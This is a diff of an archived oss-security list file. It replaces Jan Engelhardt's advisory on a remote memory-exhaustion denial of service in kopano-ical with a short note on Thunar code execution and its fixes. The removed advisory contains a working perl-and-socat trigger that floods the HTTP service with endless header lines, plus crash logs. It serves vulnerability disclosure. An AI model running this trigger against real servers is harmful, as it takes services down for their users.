@@ -1,56 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/19/6
-Message-ID: <r4p33o1o-q1pp-8932-qso-36op579rn850@inai.de>
-Date: Fri, 19 Mar 2021 13:44:24 +0100 (CET)
-From: Jan Engelhardt <jengelh@...i.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/09/2
+Message-ID: <2d1bd340-fac1-b16a-c046-494c2d58f369@enst-bretagne.fr>
+Date: Sun, 9 May 2021 21:38:23 +0200
+From: Gabriel Corona <gabriel.corona@...t-bretagne.fr>
 To: oss-security@...ts.openwall.com
-Subject: kopano-core 11.0.1: Remote DoS by memory exhaustion
+Subject: Code execution through Thunar
 Content-Type: text/plain; charset=utf-8
 
+When called with a regular file as command line argument, Thunar
+would delegate to some other program without user confirmation
+based on the file type. This could be exploited to trigger code
+execution in a chain of vulnerabilities.
 
-Initial publication, no CVE number yet (will request).
+This is fixed in 4.16.7 and 4.17.2. When called with a regular
+file, Thunar now opens the containing directory and selects the
+file.
 
-# Affected versions
+A CVE ID has been requested.
 
-  * kopano-core 11.0.1     (current head of 11.x branch)
-  * kopano-core 10.0.7     (head of 10.x branch)
-  * kopano-core 9.1.0      (head of 9.x branch)
-  * kopano-core 8.7.16
-  * it is believed this affects all versions to date,
-    including zarafa 7.2.6, the discontinued predecessor
-    project to Kopano, sometimes still in use.
+Reference:
 
-The "kopano-ical" program implements a network service/trivial HTTP server.
-It imposes no length restrictions on HTTP headers, which can be exploited
-to memory-exhaust the process and have it terminate.
+https://gitlab.xfce.org/xfce/thunar/-/commit/9165a61f95e43cc0b5abf9b98eee2818a0191e0b
 
-# Trigger
+Note: the fix introduced a regression which is fixed in 4.16.8 and 4.17.3.
 
-»
-  perl -e 'print "GET / HTTP/1.0\nHost: \n"; 
-           while(1) { print " " . "A" x 65000 . "\n"; }' |
-  socat - tcp-connect:kopano-ical.example.com:8080
+https://gitlab.xfce.org/xfce/thunar/-/commit/3b54d9d7dbd7fd16235e2141c43a7f18718f5664
 
-The exact port depends on configuration; 8000 is also typical choice.
-
-» systemctl status kopano-ical
-● kopano-ical.service - Kopano Groupware Core iCal/CalDAV Gateway
-   Loaded: loaded (/usr/lib/systemd/system/kopano-ical.service; enabled; vendor preset: disabled)
-   Active: failed (Result: signal) since Fri 2021-03-19 13:24:26 CET; 32s ago
-     Docs: man:kopano-ical(8)
-           man:kopano-ical.cfg(5)
-  Process: 2126 ExecStart=/usr/sbin/kopano-ical -F (code=killed, signal=ABRT)
- Main PID: 2126 (code=killed, signal=ABRT)
-
-kopano-ical[2126]: terminate called after throwing an instance of 'std::bad_alloc'
-kopano-ical[2126]: ----------------------------------------------------------------------
-kopano-ical[2126]: Fatal error detected. Please report all following information.
-kopano-ical[2126]: kopano-ical 8.7.16.0
-kopano-ical[2126]:   what():  std::bad_alloc
-systemd[1]: kopano-ical.service: Main process exited, code=killed, status=6/ABRT
-systemd[1]: kopano-ical.service: Unit entered failed state.
-systemd[1]: kopano-ical.service: Failed with result 'signal'.
-
-# Mitigation
-
-None known at this time.
+Gabriel
